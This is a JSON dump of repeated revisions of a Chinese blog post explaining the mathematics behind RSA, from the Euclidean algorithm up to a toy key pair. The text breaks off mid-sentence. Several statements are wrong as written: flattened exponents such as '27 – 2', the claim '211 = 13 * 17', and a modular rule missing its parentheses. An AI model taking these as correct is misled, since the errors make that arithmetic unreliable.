（四）Fermat 小定理\\n\\n1640 年, 法国业余数学家 Pierre de Fermat(通常译作\\\"费马\\\")发现, 如果 n 是一个质数的话, 那么对于任意一个数 a, a 的 n 次方减去 a 之后都将是 n 的倍数. 例如, 7 是一个质数, 于是 27 – 2, 37 – 3, 47 – 4, 甚至 1007 – 100, 统统都能被 7 整除. 关于费马小定理的证明, 读者可以参见原文.\\n\\nFermat 小定理有一个等价的表述: 如果 n 是一个质数的话, 那么对于任意一个数 a, 随着 i 的增加, a 的 i 次方除以 n 的余数将会呈现出长度为 n – 1 的周期性. \\n\\n为什么呢?\\n\\n根据费马小定理, a^n 与 a 的差能够被 n 整除, 这相当于 a^n 和 a 分别都除以 n 之后将会拥有相同的余数. 另一方面, a^i 除以 n 的余数, 完全由 a^i-1 除以 n 的余数决定, 比方说, 假如我们已经知道 33 除以 7 等于 3 余 6, 这表明 33 里包含 3 个 7 以及 1 个 6. 因此, 34 里就包含 9 个 7 以及 3 个 6, 或者说 9 个 7 以及 1 个 18. 为了得到 34 除以 7 的余数，实际上只需要看看 18 除以 7 余多少就行了. 可见, 要想算出 a^i-1 · a 除以 n 的余数，我们不需要完整地知道 a^i-1 的值, 只需要知道 a^i-1 除以 n 的余数就可以了\\n\\n*重点* 相乘之前事先对乘数取余不会对结果造成影响, 可用数学表达式表示为:\\n\\n```\\n(a * b) % p = (a % p * b % p) % p\\n```\\n\\n这也是取模运算的基本运算法则\\n\\n\\n值得注意的是, n – 1 并不见得是最小的周期. 如 2^i 除以 7 的余数情况, 余数序列确实存在长度为 6 的周期现象, 但实际上它有一个更小的周期 3.\\n\\n假如某个整数 n 等于两个质数 p, q 的乘积，那么对于任意一个整数 a ，写出 a^i 依次除以 n 所得的余数序列, p – 1 和 q – 1 的最小公倍数将成为该序列的一个周期. 事实上， p – 1 和 q – 1 的任意一个公倍数, 比如表达起来最方便的 (p – 1) × (q – 1), 也将成为该序列的一个周期.\"}],[\"markdown\",{\"markdown\":\"### （五）公钥加密的可能性\\n\\n加密算法和解密算法有可能是不对称的吗？\\n\\n小时候我经常在朋友之间表演这么一个数学小魔术: 让对方任意想一个三位数, 把这个三位数乘以 91 的乘积的末三位告诉我, 我便能猜出对方原来想的数是多少. 如果对方心里想的数是 123, 那么对方就计算出 123 × 91 等于 11193, 并把结果的末三位 193 告诉我. 看起来, 这么做似乎损失了不少信息, 让我没法反推出原来的数. 不过, 我仍然有办法: 只需要把对方告诉我的结果再乘以 11, 乘积的末三位就是对方刚开始想的数了. 你可以验证一下， 193 × 11 = 2123 ，末三位正是对方所想的秘密数字! 其实道理很简单, 91 乘以 11 等于 1001, 而任何一个三位数乘以 1001 后, 末三位显然都不变（例如 123 乘以 1001 就等于 123123 ）. 先让对方在他所想的数上乘以 91, 假设乘积为 X, 我再在 X 的基础上乘以 11, 其结果相当于我俩合作把原数乘以了 1001, 自然末三位又变了回去.\\n\\n不过, 加密和解密的过程不对称并不妨碍我们根据加密方法推出解密方法来, 虽然这可能得费些功夫. 比方说, 刚才的加密算法就能被破解: 猜出对方心里想的数相当于求解形如 91x mod 1000 = 193 的方程, 这可以利用扩展的辗转相除法很快求解出来. \\n\\n为了得到一个可以公开加密钥匙的算法, 我们需要一种在只知道加密钥匙的情况下, 构造出解密钥匙非常非常困难的算法。\\n\\n1970 年左右，科学家们开始认真地思考“公钥加密系统”的可能性。 1977 年，来自 MIT 的 Ron Rivest 、 Adi Shamir 和 Leonard Adleman 三个人合写了一篇论文，给出了一种至今仍然安全的公钥加密算法。随后，该算法以三人名字的首字母命名，即 RSA 算法。\\n\\nRSA 算法用到了一种非常犀利的不对称性——大数分解难题.\\n\\n这种不对称性的点在于, 我们可以很容易的判断一个数是否是质数(稍后会讲到), 进而可以很容易的生成一个很大的质数, 但是到目前为止, 我们却没有一种高效的方法, 判断将一个大数分解成两个质数的乘积.\\n\\n判断一个数是否是质数的方法, 可以搜索以下内容: \\n\\n```\\n Fermat 素性测试\\n Miller-Rabin 素性测试\\n AKS 素性测试\\n```\"}],[\"markdown\",{\"markdown\":\"### （六）RSA 算法\\n\\n 所有工作都准备就绪, 下面我们可以开始描述 RSA 算法了.\\n \\n  首先, 找两个质数, 比如说 13 和 17 (实际使用时, 我们会选取大得多的质数). 把它们乘在一起, 得 221. 再计算出 (13 – 1) × (17 – 1) = 192. 根据前面的结论, 任选一个数 a, 它的 i 次方除以 221 的余数将会呈现长度为 192 的周期(虽然可能存在更短的周期). 换句话说, 对于任意的一个 a, a, a^193, a^385, a^577 ... 除以 221 都拥有相同的余数. 注意到, 385 可以写成 11 × 35 ... 嘿嘿，这下我们就又能变数学小魔术了. 叫一个人随便想一个不超过 221 的数，比如 123. 算出 123 的 11 次方除以 221 的余数, 把结果告诉你. 如果他的计算是正确的, 你将会得到 115 这个数. 看上去, 我们似乎很难把 115 还原回去, 但实际上你只需要计算 115 的 35 次方, 它除以 221 的余数就会变回 123. 这是因为, 对方把他所想的数 123 连乘了 11 次, 得到了一个数 X, 你再把这个 X 乘以自身 35 次, 这相当于你们合作把 123 连乘了 385 次, 根据周期性现象, 它除以 221 的余数仍然是 123. 然而, 计算 35 个 X 连乘时, 反正我们要取乘积除以 221 的余数, 因此我们不必完整地获知 X 的值, 只需要知道 X 除以 221 的余数就够了. 因而, 让对方只告诉你 X 取余后的结果, 不会造成信息的丢失.\\n  \\n让我们试想一下, 现在可以公开获取到的信息有 211 和 11, 如果攻击者想要解密数据就必须知道原数据的i次方对211取模的循环周期是多少(即192). 假设 211 是一个很大的数, 我们几乎没有办法把 221 分解成 13 和 17 的乘积. \\n\\n而作为生成秘钥对的一方, 我们知道 211 = 13 * 17, 进而知道原数据的i次方对211取模的循环周期是192, 那么现在, 我们要找出两个数 e 和 d ，使得 e 乘以 d 的结果除以 192 余 1 应该怎么做呢 ? \\n\\n还记得 `中国剩余定理` 吗? \\n\\n上面的问题可以写成数学表达式 `e · d mod 192 = 1`\\n\\n首先, 我们随便找一个和 192 互质的数 (这是可以做到的, 比方说, 可以不断生成小于 192 的质数, 直到找到一个不能整除 192 的为止），把它用作我们的 e (比如 11). 我们知道, 因为 11 和 192 互质, d 的解一定是存在的. \\n\\n让我们用 `扩展的辗转相除法` 再推导一次吧 !\\n\\n因为 192 除以 11 商 17 余 5,\\n即 17个11 比 1个192 少 5,\\n且 18个11 比 1个192 多 6,\\n那么, 35个11 比 2个192 多 1, 即 11 * 35 除以 192 商 2 余 1\\n\\n这正是我们需要的结果! d = 35\\n\\n现在, e 和 n 就可以作为加密钥匙公之于众, d 和 n 则是只有自己知道的解密钥匙. 因而，加密钥匙有时也被称作公钥, 解密钥匙有时也被称作私钥. 这就是RSA算法背后的数学原理了, 更多关于RSA算法计算过程中的优化细节可以阅读原文, 也非常我们值得仔细思考.\\n\\n<几何原本> 约于公元前300年由古希腊数学家 `欧几里得` 所著. 伟大的数学思想穿越2300多年的时空, 在今天这个互联网的时代大放异彩.\"}],[\"image\",{\"src\":\"/content/images/2019/09/----.jpg\"}],[\"markdown\",{\"markdown\":\"看到网上有些人质疑`Matrix67`的数学能力, 我想引用某网友的评论表达我的观点\\n\\n![Screen-Shot-2019-09-13-at-4.44.23-PM](/content/images/2019/09/Screen-Shot-2019-09-13-at-4.44.23-PM.png)\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[1,\"p\",[]]]}","created_at_ts":1568388347036,"created_at":"2019-09-13 15:25:47"},{"id":"5d7bb5fa3faccd0001d052d8","post_id":"5d7b12173faccd0001d04fc3","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"> 原文链接 [跨越千年的RSA算法](https://www.matrix67.com/blog/archives/5100)\"}],[\"markdown\",{\"markdown\":\"在当今这个由互联网构筑的世界里, RSA算法几乎无处不在. 例如:\\n\\n* 访问任何一个`https`证书加密的网站\\n* 通过SSH登录一台服务器\\n* 从GitHub上clone一个项目\\n\\n说来惭愧, 作为一名每天和`RSA算法`打交道的程序员, 直到最近学习了`Matrix67`大神讲解RSA算法的博客我才终于理解`RSA算法`到底是怎么一回事. 在真正介绍`RSA算法`之前作者用了大量的篇幅为读者填补了必要的数学基础, 文章共分为六个小节, 真正提到`RSA算法`的只有最后一个小节, 我之前也看过一两篇其他介绍`RSA算法`的文章, 但唯有这一次让我有一种豁然开朗的感觉.\\n\"}],[\"markdown\",{\"markdown\":\"### （一）可公度线段\\n\\n文章介绍了在<几何原本>中一种求取最大公约数的方法(Euclid 算法): 假设刚开始的两个数是 a 和 b ，其中 a > b ，那么把 a 除以 b 的余数记作 c ，把 b 除以 c 的余数记作 d ，c 除以 d 余 e ， d 除以 e 余 f ，等等等等，不断拿上一步的除数去除以上一步的余数。直到某一次除法余数为 0 了，那么此时的除数就是最终结果。因此， Euclid 算法又有一个形象的名字，叫做 `辗转相除法`\"}],[\"markdown\",{\"markdown\":\"###（二）中国剩余定理\\n\\n给出 m 个两两互质的整数，它们的乘积为 P, 假设有一个未知数 M, 如果我们已知 M 分别除以这 m 个数所得的余数, 那么在 0 到 P – 1 的范围内, 我们可以唯一地确定这个 M, 这可以看作是 M 的一个特解. 其他所有满足要求的 M ，则正好是那些除以 P 之后余数等于这个特解的数。\\n\\n`Bézout 定理` 是中国剩余定理的另一种形式. 如果 a 和 n 互质, 那么\\n\\n```\\n  a * x mod n = 1\\n  a * x mod n = 2 \\n  ...\\n  a * x mod n = n-1 \\n```\\n\\n以上所有方程都是有解的\\n\\n如果将第一个等式换成 `中国剩余定理` 的表达, 则可以表达描述为: a 和 n 互质, 那么在 0 到 a*n - 1 的范围内一定存在唯一的M, 使:\\n\\n```\\nM mod a = 0\\nM mod n = 1\\n```\\n\\n这里的 M 相当于上面的 `a * x`\"}],[\"markdown\",{\"markdown\":\"###（三）扩展的辗转相除\\n\\n根据中国剩余定理, 我们可以指定在 0 到 P-1 之间 M 一定有唯一解, 那么如何在已知m和余数的条件下求出这个M呢 ? 这就是 `扩展的辗转相除法`\\n\\n现在, 让我们尝试求解 115x mod 367 = 1, 根据中国剩余定理(或者说Bézout 定理), 由于 115 和 367 是互质的, 因此方程在 0 到 115 * 367 - 1 之间一定存在唯一解.\\n\\n我们解方程的基本思路是，不断寻找 115 的某个倍数以及 367 的某个倍数, 使得它们之间的差越来越小，直到最终变为 1.\\n\\n由 367 除以 115 得 3 余 22, \\n即 3 个 115 只比 367 少 22, \\n于是 15 个 115 就要比 5 个 367 少 110, \\n从而 16 个 115 就会比 5 个 367 多 5.\\n\\n好了，真正巧妙的就在这里了: \\n由 16 个 115 比 5 个 367 多 5, \\n可得 64 个 115 比 20 个 367 多 20\\n结合 3 个 115 比 1 个 367 少 22,\\n可得 67 个 115 比 21 个 367 少 2. \\n\\n再结合 \\\"少 2\\\" 和 \\\"多 5\\\" 两个式子，\\n由 67 个 115 比 21 个 367 少 2, \\n可得 134 个 115 比 42 个 367 少 4, \\n结合 16 个 115 比 5 个 367 多 5, \\n可得 150 个 115 比 47 个 367 多 1. \\n\\n这样，我们就解出了一个满足 115x mod 367 = 1 的 x , 即 x = 150. \\n\\n在求解过程, 我们相当于对 115 和 367 做了一遍辗转相除: 我们不断给出 115 的某个倍数和 367 的某个倍数, 通过辗转对比最近的两个结果, 让它们的差距从\\\"少 22\\\"缩小到\\\"多 5\\\", 再到\\\"少 2\\\", \\\"多 1\\\", 其中 22, 5, 2, 1 这几个数正是用辗转相除法求 115 和 367 的最大公约数时将会经历的数. 因而, 算法的步骤数仍然是对数级别的, 即使面对上百位上千位的大数, 计算机也毫无压力. \\n\\n这种求解方程 a · x mod n = b 的算法就叫做“扩展的辗转相除法”。\"}],[\"markdown\",{\"markdown\":\"### （四）Fermat 小定理\\n\\n1640 年, 法国业余数学家 Pierre de Fermat(通常译作\\\"费马\\\")发现, 如果 n 是一个质数的话, 那么对于任意一个数 a, a 的 n 次方减去 a 之后都将是 n 的倍数. 例如, 7 是一个质数, 于是 27 – 2, 37 – 3, 47 – 4, 甚至 1007 – 100, 统统都能被 7 整除. 关于费马小定理的证明, 读者可以参见原文.\\n\\nFermat 小定理有一个等价的表述: 如果 n 是一个质数的话, 那么对于任意一个数 a, 随着 i 的增加, a 的 i 次方除以 n 的余数将会呈现出长度为 n – 1 的周期性. \\n\\n为什么呢?\\n\\n根据费马小定理, a^n 与 a 的差能够被 n 整除, 这相当于 a^n 和 a 分别都除以 n 之后将会拥有相同的余数. 另一方面, a^i 除以 n 的余数, 完全由 a^i-1 除以 n 的余数决定, 比方说, 假如我们已经知道 33 除以 7 等于 3 余 6, 这表明 33 里包含 3 个 7 以及 1 个 6. 因此, 34 里就包含 9 个 7 以及 3 个 6, 或者说 9 个 7 以及 1 个 18. 为了得到 34 除以 7 的余数，实际上只需要看看 18 除以 7 余多少就行了. 可见, 要想算出 a^i-1 · a 除以 n 的余数，我们不需要完整地知道 a^i-1 的值, 只需要知道 a^i-1 除以 n 的余数就可以了\\n\\n*重点* 相乘之前事先对乘数取余不会对结果造成影响, 可用数学表达式表示为:\\n\\n```\\n(a * b) % p = (a % p * b % p) % p\\n```\\n\\n这也是取模运算的基本运算法则\\n\\n\\n值得注意的是, n – 1 并不见得是最小的周期. 如 2^i 除以 7 的余数情况, 余数序列确实存在长度为 6 的周期现象, 但实际上它有一个更小的周期 3.\\n\\n假如某个整数 n 等于两个质数 p, q 的乘积，那么对于任意一个整数 a ，写出 a^i 依次除以 n 所得的余数序列, p – 1 和 q – 1 的最小公倍数将成为该序列的一个周期. 事实上， p – 1 和 q – 1 的任意一个公倍数, 比如表达起来最方便的 (p – 1) × (q – 1), 也将成为该序列的一个周期.\"}],[\"markdown\",{\"markdown\":\"### （五）公钥加密的可能性\\n\\n加密算法和解密算法有可能是不对称的吗？\\n\\n小时候我经常在朋友之间表演这么一个数学小魔术: 让对方任意想一个三位数, 把这个三位数乘以 91 的乘积的末三位告诉我, 我便能猜出对方原来想的数是多少. 如果对方心里想的数是 123, 那么对方就计算出 123 × 91 等于 11193, 并把结果的末三位 193 告诉我. 看起来, 这么做似乎损失了不少信息, 让我没法反推出原来的数. 不过, 我仍然有办法: 只需要把对方告诉我的结果再乘以 11, 乘积的末三位就是对方刚开始想的数了. 你可以验证一下， 193 × 11 = 2123 ，末三位正是对方所想的秘密数字! 其实道理很简单, 91 乘以 11 等于 1001, 而任何一个三位数乘以 1001 后, 末三位显然都不变（例如 123 乘以 1001 就等于 123123 ）. 先让对方在他所想的数上乘以 91, 假设乘积为 X, 我再在 X 的基础上乘以 11, 其结果相当于我俩合作把原数乘以了 1001, 自然末三位又变了回去.\\n\\n不过, 加密和解密的过程不对称并不妨碍我们根据加密方法推出解密方法来, 虽然这可能得费些功夫. 比方说, 刚才的加密算法就能被破解: 猜出对方心里想的数相当于求解形如 91x mod 1000 = 193 的方程, 这可以利用扩展的辗转相除法很快求解出来. \\n\\n为了得到一个可以公开加密钥匙的算法, 我们需要一种在只知道加密钥匙的情况下, 构造出解密钥匙非常非常困难的算法。\\n\\n1970 年左右，科学家们开始认真地思考“公钥加密系统”的可能性。 1977 年，来自 MIT 的 Ron Rivest 、 Adi Shamir 和 Leonard Adleman 三个人合写了一篇论文，给出了一种至今仍然安全的公钥加密算法。随后，该算法以三人名字的首字母命名，即 RSA 算法。\\n\\nRSA 算法用到了一种非常犀利的不对称性——大数分解难题.\\n\\n这种不对称性的点在于, 我们可以很容易的判断一个数是否是质数(稍后会讲到), 进而可以很容易的生成一个很大的质数, 但是到目前为止, 我们却没有一种高效的方法, 判断将一个大数分解成两个质数的乘积.\\n\\n判断一个数是否是质数的方法, 可以搜索以下内容: \\n\\n```\\n Fermat 素性测试\\n Miller-Rabin 素性测试\\n AKS 素性测试\\n```\"}],[\"markdown\",{\"markdown\":\"### （六）RSA 算法\\n\\n 所有工作都准备就绪, 下面我们可以开始描述 RSA 算法了.\\n \\n  首先, 找两个质数, 比如说 13 和 17 (实际使用时, 我们会选取大得多的质数). 把它们乘在一起, 得 221. 再计算出 (13 – 1) × (17 – 1) = 192. 根据前面的结论, 任选一个数 a, 它的 i 次方除以 221 的余数将会呈现长度为 192 的周期(虽然可能存在更短的周期). 换句话说, 对于任意的一个 a, a, a^193, a^385, a^577 ... 除以 221 都拥有相同的余数. 注意到, 385 可以写成 11 × 35 ... 嘿嘿，这下我们就又能变数学小魔术了. 叫一个人随便想一个不超过 221 的数，比如 123. 算出 123 的 11 次方除以 221 的余数, 把结果告诉你. 如果他的计算是正确的, 你将会得到 115 这个数. 看上去, 我们似乎很难把 115 还原回去, 但实际上你只需要计算 115 的 35 次方, 它除以 221 的余数就会变回 123. 这是因为, 对方把他所想的数 123 连乘了 11 次, 得到了一个数 X, 你再把这个 X 乘以自身 35 次, 这相当于你们合作把 123 连乘了 385 次, 根据周期性现象, 它除以 221 的余数仍然是 123. 然而, 计算 35 个 X 连乘时, 反正我们要取乘积除以 221 的余数, 因此我们不必完整地获知 X 的值, 只需要知道 X 除以 221 的余数就够了. 因而, 让对方只告诉你 X 取余后的结果, 不会造成信息的丢失.\\n  \\n让我们试想一下, 现在可以公开获取到的信息有 211 和 11, 如果攻击者想要解密数据就必须知道原数据的i次方对211取模的循环周期是多少(即192). 假设 211 是一个很大的数, 我们几乎没有办法把 221 分解成 13 和 17 的乘积. \\n\\n而作为生成秘钥对的一方, 我们知道 211 = 13 * 17, 进而知道原数据的i次方对211取模的循环周期是192, 那么现在, 我们要找出两个数 e 和 d ，使得 e 乘以 d 的结果除以 192 余 1 应该怎么做呢 ? \\n\\n还记得 `中国剩余定理` 吗? \\n\\n上面的问题可以写成数学表达式 `e · d mod 192 = 1`\\n\\n首先, 我们随便找一个和 192 互质的数 (这是可以做到的, 比方说, 可以不断生成小于 192 的质数, 直到找到一个不能整除 192 的为止），把它用作我们的 e (比如 11). 我们知道, 因为 11 和 192 互质, d 的解一定是存在的. \\n\\n让我们用 `扩展的辗转相除法` 再推导一次吧 !\\n\\n因为 192 除以 11 商 17 余 5,\\n即 17个11 比 1个192 少 5,\\n且 18个11 比 1个192 多 6,\\n那么, 35个11 比 2个192 多 1, 即 11 * 35 除以 192 商 2 余 1\\n\\n这正是我们需要的结果! d = 35\\n\\n现在, e 和 n 就可以作为加密钥匙公之于众, d 和 n 则是只有自己知道的解密钥匙. 因而，加密钥匙有时也被称作公钥, 解密钥匙有时也被称作私钥. 这就是RSA算法背后的数学原理了, 更多关于RSA算法计算过程中的优化细节可以阅读原文, 也非常我们值得仔细思考.\\n\\n<几何原本> 约于公元前300年由古希腊数学家 `欧几里得` 所著. 伟大的数学思想穿越2300多年的时空, 在今天这个互联网的时代大放异彩.\"}],[\"image\",{\"src\":\"/content/images/2019/09/----.jpg\"}],[\"markdown\",{\"markdown\":\"看到网上有些人质疑`Matrix67`的数学能力, 我想引用某网友的评论表达我的观点\\n\\n![Screen-Shot-2019-09-13-at-4.44.23-PM](/content/images/2019/09/Screen-Shot-2019-09-13-at-4.44.23-PM.png)\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[1,\"p\",[]]]}","created_at_ts":1568388602144,"created_at":"2019-09-13 15:30:02"},{"id":"5d7bb6183faccd0001d052da","post_id":"5d7b12173faccd0001d04fc3","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"> 原文链接 [跨越千年的RSA算法](https://www.matrix67.com/blog/archives/5100)\"}],[\"markdown\",{\"markdown\":\"在当今这个由互联网构筑的世界里, RSA算法几乎无处不在. 例如:\\n\\n* 访问任何一个`https`证书加密的网站\\n* 通过SSH登录一台服务器\\n* 从GitHub上clone一个项目\\n\\n说来惭愧, 作为一个每天和`RSA算法`打交道的程序员, 直到最近学习了`Matrix67`大神讲解RSA算法的博客我才终于理解`RSA算法`到底是怎么一回事. 在真正介绍`RSA算法`之前作者用了大量的篇幅为读者填补了必要的数学基础, 文章共分为六个小节, 真正提到`RSA算法`的只有最后一个小节, 我之前也看过一两篇其他介绍`RSA算法`的文章, 但唯有这一次让我有一种豁然开朗的感觉.\\n\"}],[\"markdown\",{\"markdown\":\"### （一）可公度线段\\n\\n文章介绍了在<几何原本>中一种求取最大公约数的方法(Euclid 算法): 假设刚开始的两个数是 a 和 b ，其中 a > b ，那么把 a 除以 b 的余数记作 c ，把 b 除以 c 的余数记作 d ，c 除以 d 余 e ， d 除以 e 余 f ，等等等等，不断拿上一步的除数去除以上一步的余数。直到某一次除法余数为 0 了，那么此时的除数就是最终结果。因此， Euclid 算法又有一个形象的名字，叫做 `辗转相除法`\"}],[\"markdown\",{\"markdown\":\"###（二）中国剩余定理\\n\\n给出 m 个两两互质的整数，它们的乘积为 P, 假设有一个未知数 M, 如果我们已知 M 分别除以这 m 个数所得的余数, 那么在 0 到 P – 1 的范围内, 我们可以唯一地确定这个 M, 这可以看作是 M 的一个特解. 其他所有满足要求的 M ，则正好是那些除以 P 之后余数等于这个特解的数。\\n\\n`Bézout 定理` 是中国剩余定理的另一种形式. 如果 a 和 n 互质, 那么\\n\\n```\\n  a * x mod n = 1\\n  a * x mod n = 2 \\n  ...\\n  a * x mod n = n-1 \\n```\\n\\n以上所有方程都是有解的\\n\\n如果将第一个等式换成 `中国剩余定理` 的表达, 则可以表达描述为: a 和 n 互质, 那么在 0 到 a*n - 1 的范围内一定存在唯一的M, 使:\\n\\n```\\nM mod a = 0\\nM mod n = 1\\n```\\n\\n这里的 M 相当于上面的 `a * x`\"}],[\"markdown\",{\"markdown\":\"###（三）扩展的辗转相除\\n\\n根据中国剩余定理, 我们可以指定在 0 到 P-1 之间 M 一定有唯一解, 那么如何在已知m和余数的条件下求出这个M呢 ? 这就是 `扩展的辗转相除法`\\n\\n现在, 让我们尝试求解 115x mod 367 = 1, 根据中国剩余定理(或者说Bézout 定理), 由于 115 和 367 是互质的, 因此方程在 0 到 115 * 367 - 1 之间一定存在唯一解.\\n\\n我们解方程的基本思路是，不断寻找 115 的某个倍数以及 367 的某个倍数, 使得它们之间的差越来越小，直到最终变为 1.\\n\\n由 367 除以 115 得 3 余 22, \\n即 3 个 115 只比 367 少 22, \\n于是 15 个 115 就要比 5 个 367 少 110, \\n从而 16 个 115 就会比 5 个 367 多 5.\\n\\n好了，真正巧妙的就在这里了: \\n由 16 个 115 比 5 个 367 多 5, \\n可得 64 个 115 比 20 个 367 多 20\\n结合 3 个 115 比 1 个 367 少 22,\\n可得 67 个 115 比 21 个 367 少 2. \\n\\n再结合 \\\"少 2\\\" 和 \\\"多 5\\\" 两个式子，\\n由 67 个 115 比 21 个 367 少 2, \\n可得 134 个 115 比 42 个 367 少 4, \\n结合 16 个 115 比 5 个 367 多 5, \\n可得 150 个 115 比 47 个 367 多 1. \\n\\n这样，我们就解出了一个满足 115x mod 367 = 1 的 x , 即 x = 150. \\n\\n在求解过程, 我们相当于对 115 和 367 做了一遍辗转相除: 我们不断给出 115 的某个倍数和 367 的某个倍数, 通过辗转对比最近的两个结果, 让它们的差距从\\\"少 22\\\"缩小到\\\"多 5\\\", 再到\\\"少 2\\\", \\\"多 1\\\", 其中 22, 5, 2, 1 这几个数正是用辗转相除法求 115 和 367 的最大公约数时将会经历的数. 因而, 算法的步骤数仍然是对数级别的, 即使面对上百位上千位的大数, 计算机也毫无压力. \\n\\n这种求解方程 a · x mod n = b 的算法就叫做“扩展的辗转相除法”。\"}],[\"markdown\",{\"markdown\":\"### （四）Fermat 小定理\\n\\n1640 年, 法国业余数学家 Pierre de Fermat(通常译作\\\"费马\\\")发现, 如果 n 是一个质数的话, 那么对于任意一个数 a, a 的 n 次方减去 a 之后都将是 n 的倍数. 例如, 7 是一个质数, 于是 27 – 2, 37 – 3, 47 – 4, 甚至 1007 – 100, 统统都能被 7 整除. 关于费马小定理的证明, 读者可以参见原文.\\n\\nFermat 小定理有一个等价的表述: 如果 n 是一个质数的话, 那么对于任意一个数 a, 随着 i 的增加, a 的 i 次方除以 n 的余数将会呈现出长度为 n – 1 的周期性. \\n\\n为什么呢?\\n\\n根据费马小定理, a^n 与 a 的差能够被 n 整除, 这相当于 a^n 和 a 分别都除以 n 之后将会拥有相同的余数. 另一方面, a^i 除以 n 的余数, 完全由 a^i-1 除以 n 的余数决定, 比方说, 假如我们已经知道 33 除以 7 等于 3 余 6, 这表明 33 里包含 3 个 7 以及 1 个 6. 因此, 34 里就包含 9 个 7 以及 3 个 6, 或者说 9 个 7 以及 1 个 18. 为了得到 34 除以 7 的余数，实际上只需要看看 18 除以 7 余多少就行了. 可见, 要想算出 a^i-1 · a 除以 n 的余数，我们不需要完整地知道 a^i-1 的值, 只需要知道 a^i-1 除以 n 的余数就可以了\\n\\n*重点* 相乘之前事先对乘数取余不会对结果造成影响, 可用数学表达式表示为:\\n\\n```\\n(a * b) % p = (a % p * b % p) % p\\n```\\n\\n这也是取模运算的基本运算法则\\n\\n\\n值得注意的是, n – 1 并不见得是最小的周期. 如 2^i 除以 7 的余数情况, 余数序列确实存在长度为 6 的周期现象, 但实际上它有一个更小的周期 3.\\n\\n假如某个整数 n 等于两个质数 p, q 的乘积，那么对于任意一个整数 a ，写出 a^i 依次除以 n 所得的余数序列, p – 1 和 q – 1 的最小公倍数将成为该序列的一个周期. 事实上， p – 1 和 q – 1 的任意一个公倍数, 比如表达起来最方便的 (p – 1) × (q – 1), 也将成为该序列的一个周期.\"}],[\"markdown\",{\"markdown\":\"### （五）公钥加密的可能性\\n\\n加密算法和解密算法有可能是不对称的吗？\\n\\n小时候我经常在朋友之间表演这么一个数学小魔术: 让对方任意想一个三位数, 把这个三位数乘以 91 的乘积的末三位告诉我, 我便能猜出对方原来想的数是多少. 如果对方心里想的数是 123, 那么对方就计算出 123 × 91 等于 11193, 并把结果的末三位 193 告诉我. 看起来, 这么做似乎损失了不少信息, 让我没法反推出原来的数. 不过, 我仍然有办法: 只需要把对方告诉我的结果再乘以 11, 乘积的末三位就是对方刚开始想的数了. 你可以验证一下， 193 × 11 = 2123 ，末三位正是对方所想的秘密数字! 其实道理很简单, 91 乘以 11 等于 1001, 而任何一个三位数乘以 1001 后, 末三位显然都不变（例如 123 乘以 1001 就等于 123123 ）. 先让对方在他所想的数上乘以 91, 假设乘积为 X, 我再在 X 的基础上乘以 11, 其结果相当于我俩合作把原数乘以了 1001, 自然末三位又变了回去.\\n\\n不过, 加密和解密的过程不对称并不妨碍我们根据加密方法推出解密方法来, 虽然这可能得费些功夫. 比方说, 刚才的加密算法就能被破解: 猜出对方心里想的数相当于求解形如 91x mod 1000 = 193 的方程, 这可以利用扩展的辗转相除法很快求解出来. \\n\\n为了得到一个可以公开加密钥匙的算法, 我们需要一种在只知道加密钥匙的情况下, 构造出解密钥匙非常非常困难的算法。\\n\\n1970 年左右，科学家们开始认真地思考“公钥加密系统”的可能性。 1977 年，来自 MIT 的 Ron Rivest 、 Adi Shamir 和 Leonard Adleman 三个人合写了一篇论文，给出了一种至今仍然安全的公钥加密算法。随后，该算法以三人名字的首字母命名，即 RSA 算法。\\n\\nRSA 算法用到了一种非常犀利的不对称性——大数分解难题.\\n\\n这种不对称性的点在于, 我们可以很容易的判断一个数是否是质数(稍后会讲到), 进而可以很容易的生成一个很大的质数, 但是到目前为止, 我们却没有一种高效的方法, 判断将一个大数分解成两个质数的乘积.\\n\\n判断一个数是否是质数的方法, 可以搜索以下内容: \\n\\n```\\n Fermat 素性测试\\n Miller-Rabin 素性测试\\n AKS 素性测试\\n```\"}],[\"markdown\",{\"markdown\":\"### （六）RSA 算法\\n\\n 所有工作都准备就绪, 下面我们可以开始描述 RSA 算法了.\\n \\n  首先, 找两个质数, 比如说 13 和 17 (实际使用时, 我们会选取大得多的质数). 把它们乘在一起, 得 221. 再计算出 (13 – 1) × (17 – 1) = 192. 根据前面的结论, 任选一个数 a, 它的 i 次方除以 221 的余数将会呈现长度为 192 的周期(虽然可能存在更短的周期). 换句话说, 对于任意的一个 a, a, a^193, a^385, a^577 ... 除以 221 都拥有相同的余数. 注意到, 385 可以写成 11 × 35 ... 嘿嘿，这下我们就又能变数学小魔术了. 叫一个人随便想一个不超过 221 的数，比如 123. 算出 123 的 11 次方除以 221 的余数, 把结果告诉你. 如果他的计算是正确的, 你将会得到 115 这个数. 看上去, 我们似乎很难把 115 还原回去, 但实际上你只需要计算 115 的 35 次方, 它除以 221 的余数就会变回 123. 这是因为, 对方把他所想的数 123 连乘了 11 次, 得到了一个数 X, 你再把这个 X 乘以自身 35 次, 这相当于你们合作把 123 连乘了 385 次, 根据周期性现象, 它除以 221 的余数仍然是 123. 然而, 计算 35 个 X 连乘时, 反正我们要取乘积除以 221 的余数, 因此我们不必完整地获知 X 的值, 只需要知道 X 除以 221 的余数就够了. 因而, 让对方只告诉你 X 取余后的结果, 不会造成信息的丢失.\\n  \\n让我们试想一下, 现在可以公开获取到的信息有 211 和 11, 如果攻击者想要解密数据就必须知道原数据的i次方对211取模的循环周期是多少(即192). 假设 211 是一个很大的数, 我们几乎没有办法把 221 分解成 13 和 17 的乘积. \\n\\n而作为生成秘钥对的一方, 我们知道 211 = 13 * 17, 进而知道原数据的i次方对211取模的循环周期是192, 那么现在, 我们要找出两个数 e 和 d ，使得 e 乘以 d 的结果除以 192 余 1 应该怎么做呢 ? \\n\\n还记得 `中国剩余定理` 吗? \\n\\n上面的问题可以写成数学表达式 `e · d mod 192 = 1`\\n\\n首先, 我们随便找一个和 192 互质的数 (这是可以做到的, 比方说, 可以不断生成小于 192 的质数, 直到找到一个不能整除 192 的为止），把它用作我们的 e (比如 11). 我们知道, 因为 11 和 192 互质, d 的解一定是存在的. \\n\\n让我们用 